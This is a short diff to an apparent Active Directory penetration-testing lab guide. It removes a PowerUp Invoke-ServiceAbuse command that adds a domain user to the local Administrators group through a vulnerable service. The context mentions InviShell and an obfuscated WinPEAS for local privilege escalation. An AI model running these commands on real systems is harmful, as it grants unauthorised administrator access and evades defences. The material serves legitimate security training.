@@ -130,14 +130,9 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Invoke-AllChecks
 ```
 
-### Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.
-```powershell
-Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
-```
-### We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!
-
 ## Local Privilege Escalation - WinPEAS
 
+{% tabs %}
 {% tab title="WinPEAS" %}
 
 You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS:
